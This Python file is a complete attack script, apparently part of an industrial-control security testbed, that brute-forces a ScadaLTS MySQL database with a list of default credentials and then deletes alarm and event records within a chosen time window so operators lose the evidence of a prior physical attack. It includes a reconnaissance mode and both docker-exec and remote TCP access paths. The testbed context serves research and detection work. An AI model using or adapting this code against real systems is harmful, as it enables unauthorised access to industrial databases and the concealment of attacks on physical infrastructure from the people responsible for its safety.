#!/usr/bin/env python3
"""
Data Historian Tampering Attack (AV-12)
=======================================
Directly accesses the ScadaLTS MySQL database and deletes alarm/event records
within a time window, erasing the operator-visible evidence (alarms, state
changes, acknowledgements) of a prior physical attack. Single attack mode:

  --recon           Read-only reconnaissance (event counts: in-window vs baseline)
  --all             Delete alarm/event records in the window (system-wide)

The event log is system-wide, not per-microgrid, so the attack is global (it
does not target individual MGs). Deletion cascades to child tables
(userEvents, scheduledExecuteInactiveEvent) via ON DELETE CASCADE.

Access methods:
  Docker exec (default):  Uses `docker exec scada_database mysql` (same-host only)
  Direct MySQL TCP:       Uses --db-host/--db-port (remote/distributed deployment)

Usage:
    # Recon (read-only, show event counts)
    python attacks/scada_historian_attack.py --recon

    # Delete the last 30 minutes of events
    python attacks/scada_historian_attack.py --all --minutes 30

    # Delete the last 10 minutes (default window)
    python attacks/scada_historian_attack.py --all

    # Remote database (distributed deployment)
    python attacks/scada_historian_attack.py --recon --db-host 192.168.10.40 --tcp

    # Using env file
    python attacks/scada_historian_attack.py --all --env-file deployment/prod.env

MITRE ATT&CK ICS: T0872 (Indicator Removal on Host), T0809 (Data Destruction)
"""

import argparse
import subprocess
import sys


# Credential list for MySQL brute force
DB_CREDENTIALS = [
    ('root', 'root'),
    ('scadalts', 'scadalts'),
    ('root', ''),
    ('admin', 'admin'),
]

# ScadaLTS event source types (events.typeId) — for the recon breakdown.
EVENT_TYPE_NAMES = {
    1: 'Point alarm', 2: 'Data source', 3: 'System', 4: 'Compound',
    5: 'Scheduled', 6: 'Publisher', 8: 'Audit',
}


class HistorianAttacker:
    """Attack ScadaLTS MySQL database to erase the alarm/event log."""

    def __init__(self, db_host='localhost', db_port=3306, use_docker=True, verbose=False):
        self.db_host = db_host
        self.db_port = db_port
        self.use_docker = use_docker
        self.verbose = verbose
        self.db_user = None
        self.db_pass = None
        self.connection = None  # For direct MySQL mode

    def log(self, msg):
        if self.verbose:
            print(f"  [*] {msg}")

    # ------------------------------------------------------------------
    # Database access (two modes: docker exec or direct TCP)
    # ------------------------------------------------------------------
    def _query_docker(self, sql, modify=False):
        """Execute SQL via docker exec scada_database mysql."""
        try:
            cmd = ['docker', 'exec', 'scada_database', 'mysql',
                   '-u', self.db_user, f'-p{self.db_pass}', 'scadalts',
                   '-e', sql, '-N']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if result.returncode != 0:
                self.log(f"MySQL error: {result.stderr.strip()}")
                return None
            return result.stdout
        except subprocess.TimeoutExpired:
            self.log("MySQL query timed out")
            return None
        except Exception as e:
            self.log(f"Docker exec failed: {e}")
            return None

    def _query_direct(self, sql, modify=False):
        """Execute SQL via direct TCP connection (mysql-connector-python)."""
        if not self.connection:
            return None
        try:
            cursor = self.connection.cursor()
            cursor.execute(sql)
            if modify:
                self.connection.commit()
                return str(cursor.rowcount)
            rows = cursor.fetchall()
            return '\n'.join('\t'.join(str(c) for c in row) for row in rows)
        except Exception as e:
            self.log(f"Query failed: {e}")
            return None

    def query(self, sql, modify=False):
        """Execute SQL using configured access method."""
        if self.use_docker:
            return self._query_docker(sql, modify)
        else:
            return self._query_direct(sql, modify)

    def _scalar(self, sql, default=0):
        """Run a single-value query and return it as an int."""
        result = self.query(sql)
        if result and result.strip():
            try:
                return int(result.strip().split('\t')[0])
            except (ValueError, IndexError):
                return default
        return default

    # ------------------------------------------------------------------
    # Authentication
    # ------------------------------------------------------------------
    def connect(self):
        """Connect to MySQL database (brute force credentials)."""
        print("[+] Phase 1: Connecting to MySQL database...")

        if self.use_docker:
            return self._connect_docker()
        else:
            return self._connect_direct()

    def _connect_docker(self):
        """Brute force MySQL credentials via docker exec."""
        for user, passwd in DB_CREDENTIALS:
            try:
                cmd = ['docker', 'exec', 'scada_database', 'mysql',
                       '-u', user, f'-p{passwd}', 'scadalts',
                       '-e', 'SELECT 1;', '-N']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    self.db_user = user
                    self.db_pass = passwd
                    print(f"    Credentials found: {user}:{passwd}")
                    print(f"    Access: docker exec scada_database")
                    return True
                self.log(f"Failed: {user}:{passwd}")
            except Exception:
                continue
        print("    [-] Cannot connect to MySQL via docker exec")
        return False

    def _connect_direct(self):
        """Brute force MySQL credentials via direct TCP."""
        try:
            import mysql.connector
        except ImportError:
            print("    [-] mysql-connector-python not installed")
            print("        Install: pip install mysql-connector-python")
            return False

        for user, passwd in DB_CREDENTIALS:
            try:
                conn = mysql.connector.connect(
                    host=self.db_host, port=self.db_port,
                    user=user, password=passwd, database='scadalts',
                    connect_timeout=5,
                )
                self.connection = conn
                self.db_user = user
                self.db_pass = passwd
                print(f"    Credentials found: {user}:{passwd}")
                print(f"    Access: TCP {self.db_host}:{self.db_port}")
                return True
            except Exception:
                self.log(f"Failed: {user}:{passwd}")
                continue
        print(f"    [-] Cannot connect to MySQL at {self.db_host}:{self.db_port}")
        return False

    # ------------------------------------------------------------------
    # Recon (read-only): event counts scoped to the deletion window
    # ------------------------------------------------------------------
    def recon(self, minutes):
        """Read-only recon scoped to the deletion target (the event log).

        Reports the in-window event count (exactly what --all would delete)
        next to the prior-window baseline (what the detector compares against)
        and the all-time total. Running recon before and after an attack and
        diffing the "In window" count shows precisely what the deletion erased.
        """
        print(f"[+] Event-Deletion Reconnaissance (last {minutes} min window):")
        print()

        window = (f"activeTs > UNIX_TIMESTAMP(NOW() - INTERVAL {minutes} MINUTE) * 1000")
        baseline_win = (
            f"activeTs BETWEEN UNIX_TIMESTAMP(NOW() - INTERVAL {minutes * 2} MINUTE) * 1000 "
            f"AND UNIX_TIMESTAMP(NOW() - INTERVAL {minutes} MINUTE) * 1000"
        )
        total = self._scalar("SELECT COUNT(*) FROM events;")
        in_window = self._scalar(f"SELECT COUNT(*) FROM events WHERE {window};")
        baseline = self._scalar(f"SELECT COUNT(*) FROM events WHERE {baseline_win};")

        print(f"  {'Metric':<40} {'Count':>10}")
        print(f"  {'-'*40} {'-'*10}")
        print(f"  {'Total events in table':<40} {total:>10}")
        print(f"  {'Events in window (DELETE target)':<40} {in_window:>10}")
        print(f"  {'Events in prior ' + str(minutes) + ' min (baseline)':<40} {baseline:>10}")
        print()

        # In-window breakdown by event source type
        result = self.query(
            f"SELECT typeId, COUNT(*) FROM events WHERE {window} "
            f"GROUP BY typeId ORDER BY COUNT(*) DESC;"
        )
        if result and result.strip():
            print("  In-window events by type:")
            for line in result.strip().split('\n'):
                parts = line.split('\t')
                if len(parts) >= 2:
                    tid = int(parts[0])
                    name = EVENT_TYPE_NAMES.get(tid, f'Type {tid}')
                    print(f"    {name:<20} {parts[1]:>8}")
            print()

        print(f"  --all --minutes {minutes} would delete ~{in_window} events "
              f"(baseline {baseline} in the prior window survives — that gap is the "
              f"detector's signal).")

    # ------------------------------------------------------------------
    # Attack: Delete Events
    # ------------------------------------------------------------------
    def delete_events(self, minutes):
        """Delete alarm/event records in the time window (system-wide).

        FK constraints on userEvents and scheduledExecuteInactiveEvent are
        ON DELETE CASCADE, so child rows are removed automatically.
        """
        print(f"[+] Phase 2: Deleting alarm/event records (last {minutes} min)...")

        window = f"activeTs > UNIX_TIMESTAMP(NOW() - INTERVAL {minutes} MINUTE) * 1000"
        count = self._scalar(f"SELECT COUNT(*) FROM events WHERE {window};")
        print(f"    Found {count} event records to delete")

        if count == 0:
            print("    Nothing to delete")
            return 0

        self.query(f"DELETE FROM events WHERE {window};", modify=True)
        print(f"    [OK] Deleted {count} event records "
              f"(child userEvents rows cascade-deleted)")
        return count

    def close(self):
        """Close database connection."""
        if self.connection:
            self.connection.close()
            self.connection = None


def main():
    parser = argparse.ArgumentParser(
        description="Data Historian Tampering Attack (AV-12) — event-log deletion",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Mode:
    --recon  Read-only recon (in-window vs baseline event counts)
    --all    Delete alarm/event records in the window (system-wide)

Examples:
    # Recon (read-only)
    python attacks/scada_historian_attack.py --recon

    # Delete the last 30 minutes of events
    python attacks/scada_historian_attack.py --all --minutes 30

    # Delete the last 10 minutes (default window)
    python attacks/scada_historian_attack.py --all

    # Remote database
    python attacks/scada_historian_attack.py --all --db-host 192.168.10.40 --tcp
    python attacks/scada_historian_attack.py --all --env-file deployment/prod.env

Recovery / detection:
    python detection/scada_historian_detect.py
    python attacks/scada_historian_recovery.py --forensic
        """
    )
    # Attack mode
    parser.add_argument('--recon', action='store_true',
                        help='Read-only event-log reconnaissance')
    parser.add_argument('--all', action='store_true',
                        help='Delete alarm/event records in the window (system-wide)')

    # Time window
    parser.add_argument('--minutes', type=int, default=10,
                        help='Time window in minutes (default: 10)')

    # Database connection
    parser.add_argument('--db-host', default='localhost',
                        help='MySQL host (default: localhost)')
    parser.add_argument('--db-port', type=int, default=3306,
                        help='MySQL port (default: 3306)')
    parser.add_argument('--docker', action='store_true', default=True,
                        help='Use docker exec for DB access (default)')
    parser.add_argument('--tcp', action='store_true',
                        help='Use direct TCP for DB access (requires mysql-connector-python)')
    parser.add_argument('--env-file', default=None,
                        help='Load service addresses from env file (e.g., deployment/prod.env)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    # Override defaults from env file
    if args.env_file:
        from env_loader import load_env_file, resolve_addresses
        addrs = resolve_addresses(load_env_file(args.env_file))
        if args.db_host == 'localhost':
            args.db_host = addrs['db_host']
        if args.db_port == 3306:
            args.db_port = addrs['db_port']
        # Note: we intentionally do NOT auto-switch to --tcp here. The scada_database
        # container typically has no host port published (see generated scada_service
        # docker-compose), so docker exec is the only reliable path when running on
        # the scada_service. Pass --tcp explicitly if you need to reach MySQL over TCP.

    # Validate arguments
    if not args.recon and not args.all:
        parser.print_help()
        sys.exit(1)

    # Determine access mode
    use_docker = not args.tcp

    print("=" * 65)
    print("  Data Historian Tampering Attack (AV-12) — event-log deletion")
    print("=" * 65)
    mode_parts = []
    if args.recon:
        mode_parts.append("Recon")
    if args.all:
        mode_parts.append("Delete Events")
    print(f"  Mode: {', '.join(mode_parts)}")
    if args.all:
        print(f"  Target: events table (system-wide)")
    print(f"  Time window: {args.minutes} minutes")
    print(f"  DB access: {'docker exec' if use_docker else f'TCP {args.db_host}:{args.db_port}'}")
    print()

    attacker = HistorianAttacker(
        db_host=args.db_host, db_port=args.db_port,
        use_docker=use_docker, verbose=args.verbose,
    )

    # Connect
    if not attacker.connect():
        sys.exit(1)
    print()

    # Execute
    if args.recon:
        attacker.recon(args.minutes)
    if args.all:
        print()
        attacker.delete_events(args.minutes)

    attacker.close()

    print()
    print("=" * 65)
    print("  Attack complete!")
    print("=" * 65)


if __name__ == '__main__':
    main()
